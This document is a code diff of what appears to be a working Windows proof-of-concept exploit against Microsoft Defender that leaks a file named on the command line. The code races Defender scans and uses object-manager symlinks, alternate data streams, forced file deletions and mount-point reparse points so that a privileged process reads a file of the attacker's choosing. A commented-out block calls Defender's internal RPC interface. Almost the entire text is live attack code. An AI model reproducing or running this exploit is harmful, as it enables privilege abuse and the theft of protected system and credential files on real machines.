@@ -22,6 +22,7 @@
 #include <comdef.h>
 #include <ktmw32.h>
 #include <Shlwapi.h>
+#include "offreg.h"
 #include "resource.h"
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "Shlwapi.lib")
@@ -33,10 +34,12 @@
 
 
 
-HANDLE hWebDavReady = CreateEvent(NULL, FALSE, FALSE, NULL);
-HANDLE hFileNameReady = CreateEvent(NULL, FALSE, FALSE, NULL);
-wchar_t NewFileName[MAX_PATH] = { 0 };
-HANDLE hReturnRequest = CreateEvent(NULL, FALSE, FALSE, NULL);
+typedef struct _OBJECT_DIRECTORY_INFORMATION {
+	UNICODE_STRING Name;
+	UNICODE_STRING TypeName;
+} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;
+
+
 
 #define ALL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE
 
@@ -47,11 +50,6 @@ HGLOBAL hResData_zip = LoadResource(NULL, hResInfo_zip);
 LPVOID pResourceData_zip = LockResource(hResData_zip);
 DWORD dwSize_zip = SizeofResource(NULL, hResInfo_zip);
 
-
-HRSRC hResInfo_dll = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), L"dll");
-HGLOBAL hResData_dll = LoadResource(NULL, hResInfo_dll);
-LPVOID pResourceData_dll = LockResource(hResData_dll);
-DWORD dwSize_dll = SizeofResource(NULL, hResInfo_dll);
 
 #define MP_THREAT_STAT_MAX_VALUE 1000
 #define MP_MAX_SUGGESTIONS 10000
@@ -650,11 +648,6 @@ typedef struct _REPARSE_DATA_BUFFER {
 
 #define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)
 
-typedef struct _OBJECT_DIRECTORY_INFORMATION {
-	UNICODE_STRING Name;
-	UNICODE_STRING TypeName;
-} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;
-
 
 HMODULE ntdllhm = GetModuleHandle(L"ntdll.dll");
 
@@ -745,6 +738,118 @@ NTSTATUS (WINAPI* _NtDeleteFile)(
 	POBJECT_ATTRIBUTES ObjectAttributes
 ))GetProcAddress(ntdllhm, "NtDeleteFile");
 
+
+//////////////////////////////////////////////////////////////////////
+// Functions required by RPC
+/////////////////////////////////////////////////////////////////////
+
+void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
+{
+	return((void __RPC_FAR*) malloc(cBytes));
+}
+
+void __RPC_USER midl_user_free(void __RPC_FAR* p)
+{
+	free(p);
+}
+//////////////////////////////////////////////////////////////////////
+// Functions required by RPC end
+/////////////////////////////////////////////////////////////////////
+
+
+
+/*
+// structures and global vars used by volume shadow copy functions
+struct cldcallbackctx {
+
+	HANDLE hnotifywdaccess;
+	HANDLE hnotifylockcreated;
+	wchar_t filename[MAX_PATH];
+};
+
+struct LLShadowVolumeNames
+{
+	wchar_t* name;
+	LLShadowVolumeNames* next;
+};
+
+struct cloudworkerthreadargs {
+	HANDLE hlock;
+	HANDLE hcleanupevent;
+	HANDLE hvssready;
+};
+///////////////////////////////////////
+
+
+
+
+
+
+//////////////////////////////////////////////////////////////////////
+// WD RPC functions
+/////////////////////////////////////////////////////////////////////
+void ThrowFunc()
+{
+	throw 0;
+}
+
+void RaiseExceptionInThread(HANDLE hthread)
+{
+	CONTEXT ctx = { 0 };
+	ctx.ContextFlags = CONTEXT_FULL;
+	SuspendThread(hthread);
+
+	if (GetThreadContext(hthread, &ctx))
+	{
+		ctx.Rip = (DWORD64)ThrowFunc;
+		SetThreadContext(hthread, &ctx);
+		ResumeThread(hthread);
+	}
+}
+
+void CallWD(WDRPCWorkerThreadArgs* args)
+{
+	RPC_WSTR MS_WD_UUID = (RPC_WSTR)L"c503f532-443a-4c69-8300-ccd1fbdb3839";
+	RPC_WSTR StringBinding;
+	if (RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL, (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24", NULL, &StringBinding) != RPC_S_OK)
+	{
+		printf("Unexpected error while building an RPC binding from string !!!");
+		RaiseExceptionInThread(args->hntfythread);
+		return;
+	}
+	RPC_BINDING_HANDLE bindhandle = 0;
+	if (RpcBindingFromStringBindingW(StringBinding, &bindhandle) != RPC_S_OK)
+	{
+		printf("Failed to connect to windows defender RPC port !!!");
+		RaiseExceptionInThread(args->hntfythread);
+		return;
+	}
+	error_status_t errstat = 0;
+	printf("Calling ServerMpUpdateEngineSignature...\n");
+	//_getch();
+	RPC_STATUS stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, NULL, args->dirpath, &errstat);
+	args->res = stat;
+	if (args->hevent)
+		SetEvent(args->hevent);
+
+}
+
+DWORD WINAPI WDCallerThread(void* args)
+{
+	if (!args)
+		return ERROR_BAD_ARGUMENTS;
+	CallWD((WDRPCWorkerThreadArgs*)args);
+	return ERROR_SUCCESS;
+
+}
+//////////////////////////////////////////////////////////////////////
+// WD RPC functions end
+/////////////////////////////////////////////////////////////////////
+
+*/
+
+
+
 class ObjectSymlinkMgr {
 
 public:
@@ -801,7 +906,6 @@ private:
 	HANDLE hobjdir;
 
 };
-
 
 void GenerateGUID(wchar_t* guid)
 {
@@ -952,7 +1056,7 @@ DWORD WINAPI WDStartScan(void*)
 	scanrsrc.pResourceList = &scaninfo;
 
 	MPHANDLE scanctx = NULL;
-	hres = _MpScanStart(hbinding, MPSCAN_TYPE_RESOURCE, 0x60004000, &scanrsrc, NULL, &scanctx);
+	hres = _MpScanStart(hbinding, MPSCAN_TYPE_RESOURCE, 0x60004002, &scanrsrc, NULL, &scanctx);
 	// 0x8050111C scan pending
 	if (hres)
 	{
@@ -1019,67 +1123,10 @@ DWORD WINAPI WDStartScan(void*)
 }
 
 
-void CALLBACK CLBK(
-	_In_ CONST CF_CALLBACK_INFO* CallbackInfo,
-	_In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters
-) {
-	LARGE_INTEGER offset = CallbackParameters->FetchData.RequiredFileOffset;
-	LARGE_INTEGER length = CallbackParameters->FetchData.RequiredLength;
-	DWORD* RNA = (DWORD*)CallbackInfo->CallbackContext;
-	CF_OPERATION_PARAMETERS opParams = { 0 };
-	opParams.ParamSize = sizeof(CF_OPERATION_PARAMETERS);
-
-	if (*RNA == 1) {
-		opParams.TransferData.Buffer = pResourceData_zip;
-		opParams.TransferData.Offset = offset;
-		opParams.TransferData.Length.QuadPart = dwSize_zip;
-		*RNA = 2;
-	}
-	else {
-		opParams.TransferData.Buffer = pResourceData_dll;
-		opParams.TransferData.Offset = offset;
-		opParams.TransferData.Length.QuadPart = dwSize_dll;
-	}
-	opParams.TransferData.CompletionStatus = STATUS_SUCCESS;
-	CF_OPERATION_INFO opInfo = { 0 };
-	opInfo.StructSize = sizeof(CF_OPERATION_INFO);
-	opInfo.Type = CF_OPERATION_TYPE_TRANSFER_DATA;
-	opInfo.ConnectionKey = CallbackInfo->ConnectionKey;
-	opInfo.TransferKey = CallbackInfo->TransferKey;
-	HRESULT hr = S_OK;
-
-	hr = CfExecute(&opInfo, &opParams);
-	if (FAILED(hr)) {
-		std::wcerr << L"[-] CfExecute failed with HRESULT: 0x" << std::hex << hr << std::endl;
-		throw hr;
-	}
-	printf("[+] Cloud provider callback success.\n");
-	{
-		CF_OPERATION_PARAMETERS opParams = { 0 };
-		CF_OPERATION_INFO opInfo = { 0 };
-		HRESULT hr = S_OK;
-
-		opParams.ParamSize = sizeof(CF_OPERATION_PARAMETERS);
-		opParams.AckData.CompletionStatus = STATUS_SUCCESS;
-		opParams.AckData.Flags = CF_OPERATION_ACK_DATA_FLAG_NONE;
-		opParams.AckData.Length = length;
-		opParams.AckData.Offset = offset;
-		opInfo.StructSize = sizeof(CF_OPERATION_INFO);
-		opInfo.Type = CF_OPERATION_TYPE_ACK_DATA;
-		opInfo.ConnectionKey = CallbackInfo->ConnectionKey;
-		opInfo.TransferKey = CallbackInfo->TransferKey;
-		hr = CfExecute(&opInfo, &opParams);
-		if (FAILED(hr)) {
-			std::wcerr << L"[-] CfExecute failed with HRESULT: 0x" << std::hex << hr << std::endl;
-			throw hr;
-		}
-		printf("[+] Cloud provider callback success.\n");
-	}
-}
-
 
 int wmain(int argc, wchar_t** argv)
 {
+	
 	if (argc < 2)
 	{
 		printf("Usage : %ws <path_to_leak>\n", argv[0]);
@@ -1140,53 +1187,8 @@ int wmain(int argc, wchar_t** argv)
 		throw stat;
 	}
 	printf("[+] %ws was created.\n", _uworkdir.Buffer);
-	GUID ProviderId;
-	CLSIDFromString(L"{B196E670-59C7-4D41-9637-C62D80541321}", &ProviderId);
-	CF_SYNC_REGISTRATION reg = { 0 };
-	reg.StructSize = sizeof(reg);
-	reg.ProviderName = L"Flubber";
-	reg.ProviderVersion = L"1.0";
-	reg.ProviderId = ProviderId;
-
-	CF_SYNC_POLICIES policies = { 0 };
-	policies.StructSize = sizeof(policies);
-	policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
-	policies.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
-	policies.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_AUTO_DEHYDRATION_ALLOWED | CF_HYDRATION_POLICY_MODIFIER_VALIDATION_REQUIRED;
-	policies.InSync = CF_INSYNC_POLICY_TRACK_ALL;
-	policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;
-	HRESULT hs = CfRegisterSyncRoot(workdir.c_str(), &reg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
-	if (hs)
-		throw hs;
-	printf("[+] Cloud provider has been registered.\n");
-	CF_CALLBACK_REGISTRATION table[2];
-	table[0] = { CF_CALLBACK_TYPE_FETCH_DATA, CLBK };
-	table[1] = CF_CALLBACK_REGISTRATION_END;
-	CF_CONNECTION_KEY key = { 0 };
-	DWORD attemptn = 1;
-	hs = CfConnectSyncRoot(workdir.c_str(), table, &attemptn, CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH | CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO, &key);
-	if (hs)
-		throw hs;
-	printf("[+] Attached cloud provider to %ws\n", workdir.c_str());
-	CF_PLACEHOLDER_CREATE_INFO place_holders[1] = { 0 };
-	place_holders[0].RelativeFileName = L"BERN";
-	FILETIME ft = { 0 };
-	GetSystemTimeAsFileTime(&ft);
-	LARGE_INTEGER ttime = { 0 };
-	ttime.LowPart = ft.dwLowDateTime;
-	ttime.HighPart = ft.dwHighDateTime;
-	place_holders[0].FsMetadata.BasicInfo.CreationTime = ttime;
-	place_holders[0].FsMetadata.FileSize.QuadPart = dwSize_zip;
-	place_holders[0].FsMetadata.BasicInfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
-	place_holders[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
-	place_holders[0].FileIdentity = malloc(0x130);
-	place_holders[0].FileIdentityLength = 0x130;
-	DWORD pentries = 0;
-
-	hs = CfCreatePlaceholders(workdir.c_str(), place_holders, 1,
-		CF_CREATE_FLAG_NONE, &pentries);
-	if (hs)
-		throw hs;
+	
+	
 	printf("[+] Placeholder created.\n");
 	std::wstring targetobjdirpath = L"\\BaseNamedObjects\\Restricted\\WD_TARGET_";
 	targetobjdirpath.append(mainguid);
@@ -1218,14 +1220,22 @@ int wmain(int argc, wchar_t** argv)
 	OBJECT_ATTRIBUTES malfileobjattr = { 0 };
 	InitializeObjectAttributes(&malfileobjattr, &_umalfilepath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 	HANDLE hzip = NULL;
-	stat = NtCreateFile(&hzip, SYNCHRONIZE | FILE_READ_DATA, &malfileobjattr, &iostat2, NULL, FILE_ATTRIBUTE_HIDDEN, ALL_SHARING, FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
+	stat = NtCreateFile(&hzip, SYNCHRONIZE | FILE_READ_DATA | FILE_WRITE_DATA, &malfileobjattr, &iostat2, NULL, FILE_ATTRIBUTE_HIDDEN, ALL_SHARING, FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
 	if (stat)
 		throw stat;
 	printf("[+] Created %ws\n", ntmalfilepath.c_str());
 
-	LARGE_INTEGER fsz = { 0 };
-	fsz.QuadPart = -1;
-
+	DWORD retb2 = 0;
+	if (!WriteFile(hzip, pResourceData_zip, dwSize_zip, &retb2, NULL))
+	{
+		printf("[-] Failed to write to %ws, error : %d\n", ntmalfilepath.c_str(), GetLastError());
+		return 1;
+	}
+	CloseHandle(hzip);
+	iostat2 = { 0 };
+	stat = NtCreateFile(&hzip, SYNCHRONIZE | FILE_READ_DATA, &malfileobjattr, &iostat2, NULL, FILE_ATTRIBUTE_HIDDEN, ALL_SHARING, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
+	if (stat)
+		throw stat;
 	if (!CopyFile(L"C:\\Windows\\System32\\ntdll.dll", std::wstring(workdir + L"\\BERN:stream").c_str(), FALSE))
 	{
 		printf("[-] File copy failed.\n");
@@ -1242,33 +1252,8 @@ int wmain(int argc, wchar_t** argv)
 		return 1;
 	}
 
-	HANDLE hsp = NULL;
-	HRESULT hres2 = CfOpenFileWithOplock(malfilepath.c_str(), CF_OPEN_FILE_FLAG_FOREGROUND, &hsp);
-	if (hres2)
-	{
-		printf("Failed to open %ws error : 0x%0.8X\n", malfilepath.c_str(), hres2);
-		return 1;
-	}
-	LARGE_INTEGER li2 = { 0 };
-	li2.QuadPart = dwSize_zip;
-	hres2 = CfHydratePlaceholder(hsp, { 0 }, li2, CF_HYDRATE_FLAG_NONE, NULL);
-	if (hres2)
-	{
-		printf("Failed to hydrate %ws error : 0x%0.8X\n", malfilepath.c_str(), hres2);
-		return 1;
-	}
-	CfCloseHandle(hsp);
 	DWORD retb = 0;
 	DWORD tid = 0;
-
-	CF_TRANSFER_KEY cftranskey = { 0 };
-	hs = CfGetTransferKey(hzip, &cftranskey);
-	if (hs)
-	{
-		throw hs;
-	}
-
-
 	HANDLE hthread = CreateThread(NULL, NULL, WDStartScan, NULL, NULL, &tid);
 	if (!hthread)
 	{
@@ -1329,9 +1314,19 @@ int wmain(int argc, wchar_t** argv)
 	if (stat)
 		throw stat;
 	wchar_t clfsdelpath[MAX_PATH] = { 0 };
-	wsprintf(clfsdelpath, L"%ws\\%ws", workdir.c_str(), nfilename);
-	DeleteFile(clfsdelpath);
-
+	wsprintf(clfsdelpath, L"\\??\\%ws\\%ws", workdir.c_str(), nfilename);
+	UNICODE_STRING _uclfsdelpath = { 0 };
+	RtlInitUnicodeString(&_uclfsdelpath, clfsdelpath);
+	OBJECT_ATTRIBUTES clfsdelobjattr = { 0 };
+	InitializeObjectAttributes(&clfsdelobjattr, &_uclfsdelpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+	do {
+		stat = _NtDeleteFile(&clfsdelobjattr);
+	} while (stat == STATUS_SHARING_VIOLATION);
+	if (stat)
+	{
+		printf("[-] Failed to clfs file, error : 0x%0.8X\n", stat);
+		return 1;
+	}
 	wchar_t t2[MAX_PATH] = { 0 };
 	do {
 		ZeroMemory(buff, sizeof(buff));
@@ -1347,7 +1342,7 @@ int wmain(int argc, wchar_t** argv)
 	} while (1);
 	wcscat(t2, L":stream");
 	wchar_t fpath2[MAX_PATH] = { 0 };
-	wsprintf(fpath2, L"%ws_2\\%ws", workdir.c_str(), t2);
+	wsprintf(fpath2, L"\\??\\%ws_2\\%ws", workdir.c_str(), t2);
 	HANDLE htest = NULL;
 	do {
 		htest = CreateFile(malfilepath.c_str(), DELETE, ALL_SHARING, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -1368,8 +1363,6 @@ int wmain(int argc, wchar_t** argv)
 	}
 	CloseHandle(htest);
 	CloseHandle(hzip);
-	CfDisconnectSyncRoot(key);
-	CfUnregisterSyncRoot(workdir.c_str());
 	CloseHandle(hworkdir);
 	hworkdir = NULL;
 	stat = NtCreateFile(&hworkdir, FILE_WRITE_DATA | SYNCHRONIZE | DELETE, &workdirobjattr, &iostat2, NULL, FILE_ATTRIBUTE_DIRECTORY, ALL_SHARING, FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE, NULL, NULL);
@@ -1395,16 +1388,24 @@ int wmain(int argc, wchar_t** argv)
 	rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
 	memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, rptarget, printnamesz);
 	DWORD ret = DeviceIoControl(hworkdir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, NULL);
+	if (!ret)
+	{
+		if(GetLastError() != ERROR_IO_PENDING)
+		{
+			printf("[-] Failed to set reparse point, error : %d\n", GetLastError());
+			return 1;
+		}
 
-	wcscat(tempmv, L":stream");
+	}
+	//wcscat(tempmv, L":stream");
 	UNICODE_STRING _tempmv = { 0 };
-	RtlInitUnicodeString(&_tempmv, tempmv);
+	RtlInitUnicodeString(&_tempmv, fpath2);
 	OBJECT_ATTRIBUTES tmpmvobjattr = { 0 };
 	InitializeObjectAttributes(&tmpmvobjattr, &_tempmv, OBJ_CASE_INSENSITIVE, NULL, NULL);
 	HANDLE htempmv = NULL;
 	iostat2 = { 0 };
 	do {
-		stat = NtCreateFile(&htempmv, FILE_READ_DATA | SYNCHRONIZE | FILE_READ_ATTRIBUTES, &tmpmvobjattr, &iostat2, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
+		stat = NtCreateFile(&htempmv, FILE_READ_DATA | SYNCHRONIZE | FILE_READ_ATTRIBUTES, &tmpmvobjattr, &iostat2, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_DELETE, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
 	} while (stat);
 
 	LARGE_INTEGER lif = { 0 };
